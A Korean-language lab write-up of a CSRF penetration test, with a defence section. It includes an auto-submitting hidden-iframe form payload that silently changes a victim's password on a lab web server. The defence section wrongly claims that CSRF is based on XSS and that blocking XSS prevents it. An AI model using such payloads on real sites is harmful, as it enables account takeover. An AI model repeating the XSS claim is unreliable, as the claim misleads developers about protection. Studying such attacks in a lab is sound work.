# CSRF 모의해킹
CSRF(Cross-Site Request Forgery) 공격은 인증된 사용자의 권한을 사용하여 악의적인 요청을 보내는 공격입니다. 이번 모의해킹에서는 공격자가 악성 요청을 보내어 다른 사용자의 비밀번호를 임의로 수정하는 공격을 다루었습니다.

## 공격 실습

공격자는 다음과같은 HTML 코드를 게시글에 작성합니다.
```html
<iframe name="ifr" width=0 height=0></iframe>
<FORM target="ifr" id="chpw" METHOD="POST" action="http://192.168.219.180/login/changepw_do.php">
<INPUT type="hidden" name="pw" value="1234">
</FORM>
<script>document.getElementById("chpw").submit();</script>
패스워드 변경 1234
```
해당 코드를 살펴보면 HTML 의 iframe을 이용하여 width 와 height를 모두 0으로 설정하여 보이지 않도록하고 비밀번호를 1234로 변경하도록하는 POST 요청을 보냅니다.

**1. 사용자의 원래 비밀번호**

![csrf_userpw](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_userpw.png)

**2. 사용자가 CSRF 공격이포함된 게시글 클릭**

![csrf_click](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_click.png)

**3. 사용자의 비밀번호가 변경됨**

![csrf_changedpw](https://github.com/Tree1st/HK/blob/master/webH/image/csrf/csrf_changedpw.png)

## 대응 방안
- CSRF 토큰 사용: 서버 측에서 발급한 CSRF 토큰을 포함하여 요청을 보내도록 클라이언트에게 요청합니다. 이 토큰은 세션에 저장되어 있는 정보를 이용하여 생성됩니다. 공격자가 이 토큰을 알지 못하면 CSRF 공격을 수행할 수 없습니다.

- XSS 공격 방지: CSRF 공격은 기본적으로 XSS 공격에 기반한 공격이기 때문에 XSS 공격을 방어하면 CSRF 공격을 방어 할 수 있습니다.
